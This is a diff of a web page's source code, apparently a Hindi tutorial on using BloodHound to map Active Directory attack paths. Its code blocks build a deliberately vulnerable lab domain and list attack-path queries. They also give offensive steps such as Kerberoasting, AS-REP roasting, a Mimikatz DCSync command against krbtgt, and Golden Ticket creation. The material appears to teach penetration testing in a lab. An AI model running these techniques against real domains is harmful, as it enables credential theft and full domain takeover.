+        code={"# ज़रूरी मशीन्स:\n# 1. Windows Server 2019/2022 — Domain Controller\n# 2. Windows 10/11 — Domain Member (2-3 मशीन्स)\n# 3. Kali Linux — BloodHound चलाने के लिए\n\n# स्टेप 1: Windows Server पर AD DS इंस्टॉल:\nInstall-WindowsFeature AD-Domain-Services -IncludeManagementTools\nInstall-ADDSForest -DomainName \"lab.local\" -DomainNetBIOSName \"LAB\"\n\n# स्टेप 2: यूज़र्स और ग्रुप्स बनाओ:\nNew-ADUser -Name \"TestUser1\" -SamAccountName \"testuser1\"\nNew-ADGroup -Name \"Tier1Admins\" -GroupScope Global\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members \"Administrator\"\n\n# स्टेप 3: कंप्यूटर्स जॉइन करो:\n# Windows 10 मशीन्स को डोमेन में जॉइन करो\n\n# स्टेप 4: SharpHound चलाओ:\n# डोमेन मेंबर मशीन से:\nSharpHound.exe -c All\n\n# स्टेप 5: Kali पर BloodHound में इम्पोर्ट करो\n# Neo4j + BloodHound GUI शुरू करो\n# ZIP फाइल ड्रैग & ड्रॉप करो"}
       />
       <CodeBlock
         title="Vulnerable AD Lab Config"
-        code={`# Vulnerable configurations बनाओ (attack paths के लिए):
-
-# 1. Kerberoastable service account:
-New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" -ServicePrincipalNames "MSSQLSvc/sql01.lab.local"
-Set-ADAccountPassword -Identity "svc_sql" -NewPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force)
-Add-ADGroupMember -Identity "Domain Admins" -Members "svc_sql"
-
-# 2. AS-REP Roastable user:
-New-ADUser -Name "roastme" -SamAccountName "roastme"
-Set-ADAccountControl -Identity "roastme" -DoesNotRequirePreAuth $true
-
-# 3. Local admin on multiple machines:
-Add-ADGroupMember -Identity "Domain Admins" -Members "TestUser1"
-
-# 4. Unconstrained delegation:
-Set-ADComputer -Identity "sql01" -TrustedForDelegation $true
-
-# 5. DCSync rights:
-# एक user को Replicating Directory Changes दो
-
-# अब SharpHound चलाओ और BloodHound में देखो
-# "Find Shortest Paths to Domain Admin" query से सब paths दिखेंगे`}
+        code={"# Vulnerable configurations बनाओ (attack paths के लिए):\n\n# 1. Kerberoastable service account:\nNew-ADUser -Name \"svc_sql\" -SamAccountName \"svc_sql\" -ServicePrincipalNames \"MSSQLSvc/sql01.lab.local\"\nSet-ADAccountPassword -Identity \"svc_sql\" -NewPassword (ConvertTo-SecureString \"Password123\" -AsPlainText -Force)\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members \"svc_sql\"\n\n# 2. AS-REP Roastable user:\nNew-ADUser -Name \"roastme\" -SamAccountName \"roastme\"\nSet-ADAccountControl -Identity \"roastme\" -DoesNotRequirePreAuth $true\n\n# 3. Local admin on multiple machines:\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members \"TestUser1\"\n\n# 4. Unconstrained delegation:\nSet-ADComputer -Identity \"sql01\" -TrustedForDelegation $true\n\n# 5. DCSync rights:\n# एक user को Replicating Directory Changes दो\n\n# अब SharpHound चलाओ और BloodHound में देखो\n# \"Find Shortest Paths to Domain Admin\" query से सब paths दिखेंगे"}
       />
 
       <h2>Cypher Queries Reference</h2>
@@ -774,52 +398,11 @@ Set-ADComputer -Identity "sql01" -TrustedForDelegation $true
       </p>
       <CodeBlock
         title="Essential Cypher Queries"
-        code={`# सभी Domain Admins:
-MATCH (g:Group {name:"DOMAIN ADMINS@TARGET.LOCAL"}) MATCH (u:User) RETURN u.name
-
-# Kerberoastable users:
-MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames
-
-# AS-REP Roastable users:
-MATCH (u:User {dontreqpreauth:true}) RETURN u.name
-
-# Computers जहाँ Domain Users local admin हैं:
-MATCH p=shortestPath((g:Group {name:"DOMAIN USERS@TARGET.LOCAL"})-[MemberOf|AdminTo*1..]->(c:Computer)) RETURN p
-
-# Unconstrained Delegation computers:
-MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
-
-# DCSync rights वाले users:
-MATCH p=shortestPath((u:User)-[MemberOf|GetChanges|GetChangesAll*1..]->(d:Domain)) RETURN p
-
-# Sessions (logged in users):
-MATCH (c:Computer)-[:HasSession]->(u:User) RETURN c.name, u.name
-
-# Shortest path to Domain Admin from any user:
-MATCH p=shortestPath((u:User)-[MemberOf|AdminTo|HasSession*1..]->(g:Group {name:"DOMAIN ADMINS@TARGET.LOCAL"})) RETURN p`}
+        code={"# सभी Domain Admins:\nMATCH (g:Group {name:\"DOMAIN ADMINS@TARGET.LOCAL\"}) MATCH (u:User) RETURN u.name\n\n# Kerberoastable users:\nMATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames\n\n# AS-REP Roastable users:\nMATCH (u:User {dontreqpreauth:true}) RETURN u.name\n\n# Computers जहाँ Domain Users local admin हैं:\nMATCH p=shortestPath((g:Group {name:\"DOMAIN USERS@TARGET.LOCAL\"})-[MemberOf|AdminTo*1..]->(c:Computer)) RETURN p\n\n# Unconstrained Delegation computers:\nMATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name\n\n# DCSync rights वाले users:\nMATCH p=shortestPath((u:User)-[MemberOf|GetChanges|GetChangesAll*1..]->(d:Domain)) RETURN p\n\n# Sessions (logged in users):\nMATCH (c:Computer)-[:HasSession]->(u:User) RETURN c.name, u.name\n\n# Shortest path to Domain Admin from any user:\nMATCH p=shortestPath((u:User)-[MemberOf|AdminTo|HasSession*1..]->(g:Group {name:\"DOMAIN ADMINS@TARGET.LOCAL\"})) RETURN p"}
       />
       <CodeBlock
         title="Custom Attack Path Queries"
-        code={`# High Value targets with weak paths:
-MATCH (n {highvalue:true}), (u:User), p=shortestPath((u)-[*1..5]->(n)) RETURN p
-
-# Computers with LAPS (Local Admin Password Solution):
-MATCH (c:Computer {haslaps:true}) RETURN c.name
-
-# Computers WITHOUT LAPS:
-MATCH (c:Computer {haslaps:false}) RETURN c.name
-
-# Foreign group membership (cross-domain):
-MATCH (u:User)-[:MemberOf]->(g:Group) WHERE NOT g.domain = u.domain RETURN u.name, g.name
-
-# Users with SPN set (Kerberoastable):
-MATCH (u:User) WHERE u.serviceprincipalnames IS NOT NULL RETURN u.name, u.serviceprincipalnames
-
-# AdminCount = 1 users (privileged):
-MATCH (u:User {admincount:true}) RETURN u.name
-
-# Computers with constrained delegation:
-MATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate`}
+        code={"# High Value targets with weak paths:\nMATCH (n {highvalue:true}), (u:User), p=shortestPath((u)-[*1..5]->(n)) RETURN p\n\n# Computers with LAPS (Local Admin Password Solution):\nMATCH (c:Computer {haslaps:true}) RETURN c.name\n\n# Computers WITHOUT LAPS:\nMATCH (c:Computer {haslaps:false}) RETURN c.name\n\n# Foreign group membership (cross-domain):\nMATCH (u:User)-[:MemberOf]->(g:Group) WHERE NOT g.domain = u.domain RETURN u.name, g.name\n\n# Users with SPN set (Kerberoastable):\nMATCH (u:User) WHERE u.serviceprincipalnames IS NOT NULL RETURN u.name, u.serviceprincipalnames\n\n# AdminCount = 1 users (privileged):\nMATCH (u:User {admincount:true}) RETURN u.name\n\n# Computers with constrained delegation:\nMATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate"}
       />
 
       <h2>Azure AD (Entra ID) Integration</h2>
@@ -828,27 +411,7 @@ MATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowe
       </p>
       <CodeBlock
         title="AzureHound Usage"
-        code={`# AzureHound install करो:
-# GitHub से latest release download करो
-
-# Azure AD login:
-az login
-
-# AzureHound collect करो:
-azurehound start -u user@company.com -p password --tenant <tenant-id>
-
-# BloodHound CE में import करो:
-# ZIP फाइल upload करो
-
-# Azure-specific queries:
-# Azure Global Admins:
-MATCH (n:AZRole {name:"Global Administrator"}) RETURN n
-
-# Azure VMs with admin access:
-MATCH p=shortestPath((u:User)-[MemberOf|AZGlobalAdmin|AZVMAdmin*1..]->(v:AZVM)) RETURN p
-
-# Hybrid attack paths (on-prem to Azure):
-MATCH p=shortestPath((u:User)-[MemberOf|SyncedTo*1..]->(a:AZUser)) RETURN p`}
+        code={"# AzureHound install करो:\n# GitHub से latest release download करो\n\n# Azure AD login:\naz login\n\n# AzureHound collect करो:\nazurehound start -u user@company.com -p password --tenant <tenant-id>\n\n# BloodHound CE में import करो:\n# ZIP फाइल upload करो\n\n# Azure-specific queries:\n# Azure Global Admins:\nMATCH (n:AZRole {name:\"Global Administrator\"}) RETURN n\n\n# Azure VMs with admin access:\nMATCH p=shortestPath((u:User)-[MemberOf|AZGlobalAdmin|AZVMAdmin*1..]->(v:AZVM)) RETURN p\n\n# Hybrid attack paths (on-prem to Azure):\nMATCH p=shortestPath((u:User)-[MemberOf|SyncedTo*1..]->(a:AZUser)) RETURN p"}
       />
 
       <h2>Advanced Techniques</h2>
@@ -857,33 +420,7 @@ MATCH p=shortestPath((u:User)-[MemberOf|SyncedTo*1..]->(a:AZUser)) RETURN p`}
       </p>
       <CodeBlock
         title="Advanced Techniques"
-        code={`# KERBEROAST ATTACK PATH:
-# 1. BloodHound में "Find Kerberoastable Users" क्वेरी चलाओ
-# 2. SPN वाले यूज़र्स मिलेंगे
-# 3. Mimikatz/Invoke-Kerberoast से TGS रिक्वेस्ट करो
-# 4. हैश क्रैक करो
-
-# AS-REP ROASTING PATH:
-# 1. "Find AS-REP Roastable Users" क्वेरी
-# 2. DONT_REQ_PREAUTH वाले यूज़र्स
-# 3. GetNPUsers.py से हैश निकालो
-# 4. हैश क्रैक करो
-
-# DCSync PATH:
-# 1. "Find Principals with DCSync Rights" क्वेरी
-# 2. GetChanges + GetChangesAll वाले यूज़र्स
-# 3. Mimikatz: lsadump::dcsync /domain:target.local /user:krbtgt
-# 4. Golden Ticket बनाओ
-
-# ACL ABUSE PATH:
-# 1. GenericAll, WriteDacl, ForceChangePassword एजेज़ ढूंढो
-# 2. यूज़र प्रॉपर्टीज़ बदलो
-# 3. SPN सेट करो या पासवर्ड रीसेट करो
-
-# CROSS-FOREST TRUST PATH:
-# 1. Trusts कलेक्शन चलाओ
-# 2. फॉरेन ग्रुप मेंबरशिप ढूंढो
-# 3. फॉरेन सिड हिस्ट्री एब्यूज करो`}
+        code={"# KERBEROAST ATTACK PATH:\n# 1. BloodHound में \"Find Kerberoastable Users\" क्वेरी चलाओ\n# 2. SPN वाले यूज़र्स मिलेंगे\n# 3. Mimikatz/Invoke-Kerberoast से TGS रिक्वेस्ट करो\n# 4. हैश क्रैक करो\n\n# AS-REP ROASTING PATH:\n# 1. \"Find AS-REP Roastable Users\" क्वेरी\n# 2. DONT_REQ_PREAUTH वाले यूज़र्स\n# 3. GetNPUsers.py से हैश निकालो\n# 4. हैश क्रैक करो\n\n# DCSync PATH:\n# 1. \"Find Principals with DCSync Rights\" क्वेरी\n# 2. GetChanges + GetChangesAll वाले यूज़र्स\n# 3. Mimikatz: lsadump::dcsync /domain:target.local /user:krbtgt\n# 4. Golden Ticket बनाओ\n\n# ACL ABUSE PATH:\n# 1. GenericAll, WriteDacl, ForceChangePassword एजेज़ ढूंढो\n# 2. यूज़र प्रॉपर्टीज़ बदलो\n# 3. SPN सेट करो या पासवर्ड रीसेट करो\n\n# CROSS-FOREST TRUST PATH:\n# 1. Trusts कलेक्शन चलाओ\n# 2. फॉरेन ग्रुप मेंबरशिप ढूंढो\n# 3. फॉरेन सिड हिस्ट्री एब्यूज करो"}
       />
 
       <h2>BloodHound CE API Usage</h2>
@@ -892,40 +429,7 @@ MATCH p=shortestPath((u:User)-[MemberOf|SyncedTo*1..]->(a:AZUser)) RETURN p`}
       </p>
       <CodeBlock
         title="BloodHound CE API"
-        code={`# Login और token प्राप्त करो:
-curl -X POST http://localhost:8080/api/v2/login \\
-  -H "Content-Type: application/json" \\
-  -d '{"login_method":"secret","username":"admin","password":"admin"}'
-
-# Token से API calls:
-TOKEN="your_jwt_token"
-
-# सभी domains list करो:
-curl -X GET http://localhost:8080/api/v2/domains \\
-  -H "Authorization: Bearer $TOKEN"
-
-# Users list करो:
-curl -X GET http://localhost:8080/api/v2/domains/{domain_id}/users \\
-  -H "Authorization: Bearer $TOKEN"
-
-# Computers list करो:
-curl -X GET http://localhost:8080/api/v2/domains/{domain_id}/computers \\
-  -H "Authorization: Bearer $TOKEN"
-
-# Shortest path query:
-curl -X GET "http://localhost:8080/api/v2/graphs/shortest-path?start_type=User&end_type=Group&end_name=DOMAIN ADMINS@TARGET.LOCAL" \\
-  -H "Authorization: Bearer $TOKEN"
-
-# Python से API automation:
-# python3 -c "
-# import requests
-# base = 'http://localhost:8080/api/v2'
-# r = requests.post(f'{base}/login', json={'login_method':'secret','username':'admin','password':'admin'})
-# token = r.json()['data']['session_token']
-# headers = {'Authorization': f'Bearer {token}'}
-# domains = requests.get(f'{base}/domains', headers=headers).json()
-# print(domains)
-# "`}
+        code={"# Login और token प्राप्त करो:\ncurl -X POST http://localhost:8080/api/v2/login \\\\\n  -H \"Content-Type: application/json\" \\\\\n  -d '{\"login_method\":\"secret\",\"username\":\"admin\",\"password\":\"admin\"}'\n\n# Token से API calls:\nTOKEN=\"your_jwt_token\"\n\n# सभी domains list करो:\ncurl -X GET http://localhost:8080/api/v2/domains \\\\\n  -H \"Authorization: Bearer $TOKEN\"\n\n# Users list करो:\ncurl -X GET http://localhost:8080/api/v2/domains/{domain_id}/users \\\\\n  -H \"Authorization: Bearer $TOKEN\"\n\n# Computers list करो:\ncurl -X GET http://localhost:8080/api/v2/domains/{domain_id}/computers \\\\\n  -H \"Authorization: Bearer $TOKEN\"\n\n# Shortest path query:\ncurl -X GET \"http://localhost:8080/api/v2/graphs/shortest-path?start_type=User&end_type=Group&end_name=DOMAIN ADMINS@TARGET.LOCAL\" \\\\\n  -H \"Authorization: Bearer $TOKEN\"\n\n# Python से API automation:\n# python3 -c \"\n# import requests\n# base = 'http://localhost:8080/api/v2'\n# r = requests.post(f'{base}/login', json={'login_method':'secret','username':'admin','password':'admin'})\n# token = r.json()['data']['session_token']\n# headers = {'Authorization': f'Bearer {token}'}\n# domains = requests.get(f'{base}/domains', headers=headers).json()\n# print(domains)\n# \""}
       />
 
       <h2>Frequently Asked Questions</h2>
